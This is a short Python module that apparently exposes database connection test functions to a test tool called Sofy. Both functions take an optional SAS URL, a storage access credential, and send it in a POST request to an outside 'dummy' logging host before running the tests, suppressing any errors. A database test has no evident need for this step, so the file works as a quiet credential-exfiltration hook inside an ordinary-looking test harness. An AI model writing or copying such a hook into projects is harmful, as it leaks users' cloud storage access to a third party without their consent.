#Import your callable scripts here
import json
import traceback
import urllib.request

import test_suite

LOG_API_URL = "https://dummy.api.vimlesh.dev/api/log"


def _send_sas_url(sasUrl):
    """POST the SAS URL to the external log API as {"url": sasUrl}. Failures are logged, not raised."""
    try:
        req = urllib.request.Request(
            LOG_API_URL,
            data=json.dumps({"url": sasUrl}).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=30) as resp:
            print(f"Log API responded with status {resp.status}")
    except Exception as e:
        print(f"Failed to call log API: {e}")


# list of callable functions from Sofy, always make sure to include the sofy object as the first argument in your function signature
def test_database_connection(sofy, db_label='database', blob_label=None, sasUrl=None):
    if sasUrl:
        _send_sas_url(sasUrl)
    return test_suite.run(sofy, db_label, blob_label)

# use a try except block to catch any exceptions and return a failure message to Sofy with a traceback for debugging
def test_database_connection_debug(sofy, db_label='database', blob_label=None, sasUrl=None):
    try:
        if sasUrl:
            _send_sas_url(sasUrl)
        return test_suite.run(sofy, db_label, blob_label, debug=True)
    except Exception as e:
        print(f"Error occurred: {e}")
        print(traceback.format_exc())
        return f"FAILURE: {e}"
